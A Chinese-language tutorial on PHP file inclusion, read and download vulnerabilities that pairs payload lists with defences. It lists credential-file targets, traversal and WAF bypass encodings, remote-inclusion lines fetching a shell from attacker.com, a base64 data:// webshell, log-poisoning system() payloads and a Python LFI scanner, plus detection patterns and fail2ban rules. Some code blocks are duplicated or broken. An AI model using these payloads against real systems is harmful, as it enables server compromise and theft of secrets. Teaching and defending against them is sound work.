# 文件包含/读取/下载漏洞

## 1. 漏洞原理

### 1.1 基本概念

文件包含/读取/下载漏洞是指应用程序在处理文件操作时，未对用户输入的文件路径进行充分验证，导致攻击者可以读取或下载任意文件，包括敏感系统文件和配置文件。

### 1.2 产生原因

- **用户输入直接拼接到文件路径**

- **路径遍历过滤不充分**

- **权限设置不当**

- **错误信息泄露**

### 1.3 攻击流程

`攻击者构造恶意路径 → 应用程序拼接路径 → 系统读取文件 → 返回敏感信息`

## 2. 漏洞分类

### 2.1 文件包含漏洞

#### 2.1.1 本地文件包含（LFI）

```php
<?php include($_GET['page'] . '.php'); ?>
```

攻击载荷：`?page=../../../../etc/passwd`

#### 2.1.2 远程文件包含（RFI）

```php
<?php include($_GET['url']); ?>
```

攻击载荷：`?url=http://attacker.com/shell.txt`

### 2.2 文件读取漏洞

#### 2.2.1 直接文件读取

```php
<?php echo file_get_contents($_GET['file']); ?>
```

<?php echo file_get_contents($_GET['file']); ?>

#### 2.2.2 文件下载功能

```php
<?php
$file = $_GET['file'];
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.basename($file).'"');
readfile($file);
?>
```

<?php
$file = $_GET['file'];
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.basename($file).'"');
readfile($file);
?>

### 2.3 日志文件注入

```php
<?php
// 通过User-Agent等字段注入PHP代码到日志文件
// 然后通过LFI包含日志文件执行代码
?>
```

<?php
// 通过User-Agent等字段注入PHP代码到日志文件
// 然后通过LFI包含日志文件执行代码
?>

## 3. 常见攻击载荷

### 3.1 系统敏感文件

#### 3.1.1 Linux/Unix系统

```bash
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/proc/version
/proc/self/environ
/var/log/auth.log
/var/log/apache2/access.log
~/.bash_history
~/.ssh/id_rsa
```

#### 3.1.2 Windows系统

```cmd
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
```

#### 3.1.3 配置文件

```bash
# Web服务器配置
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/usr/local/etc/nginx/nginx.conf

# 数据库配置
/var/www/html/config.php
/var/www/html/wp-config.php
/etc/mysql/my.cnf

# 环境配置
/var/www/html/.env
/var/www/html/.env.local
```

### 3.2 应用特定文件

#### 3.2.1 Web应用

```bash
# 备份文件
index.php.bak
config.php.save
.htaccess.bak

# 版本控制
.git/config
.svn/entries
.hg/store

# 临时文件
*.swp
*.swo
*.tmp
```

## 4. 绕过技术

### 4.1 路径遍历绕过

#### 4.1.1 基础遍历

```bash
../../../../etc/passwd
....//....//....//etc/passwd
..\/..\/..\/etc/passwd
```

#### 4.1.2 URL编码绕过

```bash
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd # 双重编码
```

#### 4.1.3 Unicode编码

```bash
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
%E0%80%AF # UTF-8 overlong encoding
```

#### 4.1.4 特殊字符绕过

```bash
....//....//etc/passwd
..\..\..\Windows\System32\drivers\etc\hosts
/etc/passwd%00
/etc/passwd%2500
```

### 4.2 文件扩展名限制绕过

#### 4.2.1 空字节截断

```php
?file=../../etc/passwd%00
?file=../../etc/passwd%2500
```

#### 4.2.2 路径拼接绕过

```php
// 原始代码：include($page . '.php')
?page=../../etc/passwd%00
```

#### 4.2.3 问号绕过

```php
?file=../../etc/passwd?
?file=../../etc/passwd%23
```

### 4.3 WAF绕过技术

#### 4.3.1 大小写混合

```bash
../../Etc/PaSsWd
```

#### 4.3.2 特殊协议

```php
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

#### 4.3.3 超长路径

```bash
././././[...重复多次]./etc/passwd
```

### 4.4 日志文件注入

#### 4.4.1 通过User-Agent注入

```http
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

#### 4.4.2 通过Referer注入

```http
GET / HTTP/1.1
Referer: <?php system($_GET['cmd']); ?>
```

#### 4.4.3 包含日志文件执行

```php
?page=../../var/log/apache2/access.log
```

## 5. 高级利用技术

### 5.1 PHP包装器利用

#### 5.1.1 PHP Filter链

```php
// 读取PHP文件源码
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php

// 多重过滤器
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
```

#### 5.1.2 Data协议

```php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
data://text/plain,<?php system($_GET['cmd']); ?>
```

#### 5.1.3 Expect包装器（需要开启）

```php
expect://id
```

### 5.2 远程文件包含利用

#### 5.2.1 包含远程WebShell

```php
?url=http://attacker.com/shell.txt
```

#### 5.2.2 包含FTP服务器文件

```php
?url=ftp://attacker.com/shell.php
```

#### 5.2.3 包含SMB共享文件

```php
?url=smb://attacker.com/share/shell.php
```

### 5.3 环境变量利用

#### 5.3.1 包含/proc/self/environ

```bash
?file=../../proc/self/environ
```

#### 5.3.2 包含/proc/self/fd

```bash
?file=../../proc/self/fd/3 # 文件描述符
```

## 6. 防御措施

### 6.1 输入验证和过滤

#### 6.1.1 白名单验证

```php
function validateFilename($filename) {
    $allowed_files = [
        'home.php', 'about.php', 'contact.php',
        'news.php', 'products.php'
    ];

    return in_array($filename, $allowed_files);
}

$page = $_GET['page'] ?? 'home.php';
if (!validateFilename($page)) {
    die('Invalid page requested');
}
```

#### 6.1.2 路径遍历过滤

```php
function sanitizePath($input_path) {
    // 移除路径遍历序列
    $filtered = str_replace(['../', '..\\'], '', $input_path);

    // 移除空字节
    $filtered = str_replace("\0", '', $filtered);

    // 限制字符集
    if (!preg_match('/^[a-zA-Z0-9_\-\.\/]+$/', $filtered)) {
        return false;
    }

    return $filtered;
}
```

### 6.2 安全的文件包含

#### 6.2.1 绝对路径控制

```php
class SecureFileHandler {
 private $base_dir;

public function __construct($base_dir) {
    $this->base_dir = realpath($base_dir);
    if ($this->base_dir === false) {
        throw new Exception('Invalid base directory');
    }
}

public function includeFile($relative_path) {
    $full_path = realpath($this->base_dir . DIRECTORY_SEPARATOR . $relative_path);

    // 确保文件在基础目录内
    if ($full_path === false || strpos($full_path, $this->base_dir) !== 0) {
        throw new Exception('Access denied');
    }

    // 检查文件是否存在且可读
    if (!is_file($full_path) || !is_readable($full_path)) {
        throw new Exception('File not found');
    }

    return $full_path;
}

}
```

#### 6.2.2 映射表方式

```php
$page_mapping = [
 'home' => 'templates/home.php',
 'about' => 'templates/about.php',
 'contact' => 'templates/contact.php'
];

$page = $_GET['page'] ?? 'home';
if (!isset($page_mapping[$page])) {
 die('Page not found');
}

include($page_mapping[$page]);
```

### 6.3 文件下载安全

#### 6.3.1 ID映射方式

```php
class SecureDownload {
 private $db;
 private $download_dir;

public function __construct($db, $download_dir) {
    $this->db = $db;
    $this->download_dir = realpath($download_dir);
}

public function downloadFile($file_id) {
    // 从数据库获取文件信息
    $stmt = $this->db->prepare('SELECT filename, stored_name FROM files WHERE id = ?');
    $stmt->execute([$file_id]);
    $file = $stmt->fetch();

    if (!$file) {
        die('File not found');
    }

    $file_path = $this->download_dir . DIRECTORY_SEPARATOR . $file['stored_name'];

    // 验证文件存在且在安全目录内
    if (!is_file($file_path) || strpos(realpath($file_path), $this->download_dir) !== 0) {
        die('Invalid file');
    }

    // 设置下载头
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $file['filename'] . '"');
    header('Content-Length: ' . filesize($file_path));

    readfile($file_path);
    exit;
}

}
```

#### 6.3.2 文件类型检查

```php
function validateDownloadFile($file_path, $allowed_mime_types) {
 $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime_type = finfo_file($finfo, $file_path);
 finfo_close($finfo);
```

return in_array($mime_type, $allowed_mime_types);

```
}

$allowed_mime_types = [
 'image/jpeg', 'image/png', 'image/gif',
 'application/pdf', 'text/plain'
];
```

### 6.4 服务器配置加固

#### 6.4.1 PHP配置

```ini
; 禁用危险函数
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

; 限制文件操作
open_basedir = "/var/www/html:/tmp"

; 禁用远程文件包含
allow_url_include = Off

; 禁用URL打开
allow_url_fopen = Off
```

#### 6.4.2 Web服务器配置

##### Nginx配置

```nginx
# 限制访问敏感路径
location ~ /\. {
    deny all;
    access_log off;
    log_not_found off;
}

location ~ /(config|system|vendor)/ {
    deny all;
}

location ~* \.(env|git|svn|htaccess|htpasswd)$ {
    deny all;
}

# 限制文件下载目录
location /downloads/ {
    internal;  # 只能内部访问
}
```

##### Apache配置

```apacheconf
# 保护敏感文件
<FilesMatch "\.(env|git|svn|htaccess|htpasswd|bak|save)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# 限制目录访问
<Directory "/var/www/html/config">
    Order deny,allow
    Deny from all
</Directory>
```

### 6.5 文件系统权限

#### 6.5.1 适当的权限设置

```bash
# Web根目录权限
chown www-data:www-data /var/www/html
chmod 755 /var/www/html

# 配置文件权限
chown root:www-data /var/www/html/config.php
chmod 640 /var/www/html/config.php

# 上传目录权限（无执行权限）
chown www-data:www-data /var/www/html/uploads
chmod 755 /var/www/html/uploads
find /var/www/html/uploads -type f -exec chmod 644 {} \;
```

#### 6.5.2 使用chroot环境

```bash
# 创建chroot环境
mkdir -p /chroot/var/www/html
mount --bind /var/www/html /chroot/var/www/html
```

## 7. 安全框架和库

### 7.1 使用安全的文件操作库

#### 7.1.1 安全的文件读取类

```php
class SecureFileReader {
 private $allowed_directories;

public function __construct(array $allowed_directories) {
    $this->allowed_directories = array_map('realpath', $allowed_directories);
}

public function readFile($file_path) {
    $real_path = realpath($file_path);

    if ($real_path === false) {
        throw new Exception('File not found');
    }

    // 检查文件是否在允许的目录内
    $allowed = false;
    foreach ($this->allowed_directories as $dir) {
        if (strpos($real_path, $dir) === 0) {
            $allowed = true;
            break;
        }
    }

    if (!$allowed) {
        throw new Exception('Access denied');
    }

    // 检查文件类型（避免读取二进制文件等）
    if (!$this->isSafeFileType($real_path)) {
        throw new Exception('Unsupported file type');
    }

    return file_get_contents($real_path);
}

private function isSafeFileType($file_path) {
    $safe_extensions = ['.txt', '.log', '.csv', '.json', '.xml'];
    $extension = strtolower(strrchr($file_path, '.'));

    return in_array($extension, $safe_extensions);
}

}
```

## 8. 检测和测试

### 8.1 手动测试方法

#### 8.1.1 基础测试Payloads

```bash
# 路径遍历测试
../../../etc/passwd
..\..\..\Windows\System32\drivers\etc\hosts
....//....//....//etc/passwd

# 空字节测试
../../../etc/passwd%00
../../../etc/passwd%2500

# 编码测试
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### 8.1.2 PHP包装器测试

```php
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

### 8.2 自动化测试工具

#### 8.2.1 专用扫描工具

- **Liffy** - LFI利用工具

- **Fimap** - 文件包含漏洞扫描器

- **Burp Suite** - 包含文件包含扫描模块

#### 8.2.2 自定义测试脚本

```python
import requests
import urllib.parse

class LFITester:
 def __init__(self, target_url, param_name):
 self.target_url = target_url
 self.param_name = param_name
 self.session = requests.Session()
```

def test_traversal(self, payloads_file):
    with open(payloads_file, 'r') as f:
        payloads = f.readlines()

    for payload in payloads:
        payload = payload.strip()
        encoded_payload = urllib.parse.quote(payload)
    
        params = {self.param_name: payload}
        response = self.session.get(self.target_url, params=params)
    
        if 'root:' in response.text or 'boot loader' in response.text:
            print(f"Vulnerable: {payload}")
            return True
    
    return False

def test_php_wrappers(self):
    wrappers = [
        'php://filter/convert.base64-encode/resource=index.php',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4='
    ]

    for wrapper in wrappers:
        params = {self.param_name: wrapper}
        response = self.session.get(self.target_url, params=params)
    
        if 'PHN2ZyB' in response.text or 'phpinfo()' in response.text:
            print(f"PHP wrapper vulnerable: {wrapper}")
            return True
    
    return False

```

```

## 9. 日志和监控

### 9.1 异常访问检测

```php
class SecurityMonitor {
    public static function logFileAccess($file_path, $user_ip, $user_agent) {
        $suspicious_patterns = [
            '/\.\./', '/%2e%2e/', '/\.%2e/', '/proc\/self/',
            '/php:\/\//', '/data:\/\//', '/expect:\/\//'
        ];

        foreach ($suspicious_patterns as $pattern) {
            if (preg_match($pattern, $file_path)) {
                self::alertSuspiciousActivity($file_path, $user_ip, $user_agent);
                break;
            }
        }

        // 记录到安全日志
        error_log(sprintf(
            "File access: %s by %s - %s",
            $file_path,
            $user_ip,
            $user_agent
        ), 3, '/var/log/security.log');
    }

    private static function alertSuspiciousActivity($file_path, $user_ip, $user_agent) {
        // 发送警报邮件
        $subject = "Suspicious file access detected";
        $message = "Suspicious file access:\n";
        $message .= "File: $file_path\n";
        $message .= "IP: $user_ip\n";
        $message .= "User-Agent: $user_agent\n";
        $message .= "Time: " . date('Y-m-d H:i:s') . "\n";

        mail('security@example.com', $subject, $message);

        // 可选：暂时阻止IP
        // self::blockIP($user_ip);
    }
}
```

### 9.2 实时监控配置

#### 9.2.1 Fail2ban配置

```ini
# /etc/fail2ban/jail.d/file-inclusion.conf

[file-inclusion]
enabled = true
filter = file-inclusion
port = http,https
logpath = /var/log/apache2/access.log
maxretry = 3
bantime = 3600
```

#### 9.2.2 自定义Fail2ban过滤器

```ini
# /etc/fail2ban/filter.d/file-inclusion.conf
[Definition]
failregex = ^<HOST>.*(\.\./|\.\.%2f|php://|data://).*
ignoreregex =
```

## 10. 应急响应

### 10.1 检测到文件包含攻击

1. **立即阻断攻击者IP**

2. **检查访问日志确定影响范围**

3. **审计被访问的敏感文件**

4. **加强防护措施**

### 10.2 修复流程

```php
// 1. 识别漏洞点
$vulnerable_code = include($_GET['page']);

// 2. 实施修复
$secure_handler = new SecureFileHandler('/var/www/html/templates');
try {
    $safe_path = $secure_handler->includeFile($_GET['page']);
    include($safe_path);
} catch (Exception $e) {
    http_response_code(404);
    exit;
}

// 3. 验证修复
// 测试各种绕过技术是否有效
```

### 10.3 后续改进

1. **实施WAF规则检测路径遍历**

2. **加强输入验证和过滤**

3. **建立文件访问监控**

4. **进行安全代码审查**

## 11. 云环境特殊考虑

### 11.1 容器环境安全

```dockerfile
# Dockerfile安全配置
FROM php:8.1-apache

# 创建非root用户
RUN groupadd -r webuser && useradd -r -g webuser webuser

# 设置适当的文件权限
RUN chown -R webuser:webuser /var/www/html
RUN chmod -R 755 /var/www/html
RUN find /var/www/html -type f -exec chmod 644 {} \;

# 禁用危险函数
RUN echo "disable_functions = exec,passthru,shell_exec,system" >> /usr/local/etc/php/php.ini

USER webuser
```

### 11.2 云存储安全

```php
// 使用云存储服务避免直接文件系统访问
use Aws\S3\S3Client;

class CloudFileHandler {
 private $s3;
 private $bucket;

public function __construct($bucket) {
    $this->s3 = new S3Client([
        'version' => 'latest',
        'region'  => 'us-east-1'
    ]);
    $this->bucket = $bucket;
}

public function getFile($file_key) {
    // 通过预签名URL提供安全访问
    $command = $this->s3->getCommand('GetObject', [
        'Bucket' => $this->bucket,
        'Key'    => $file_key
    ]);

    $request = $this->s3->createPresignedRequest($command, '+20 minutes');
    return (string) $request->getUri();
}
}
```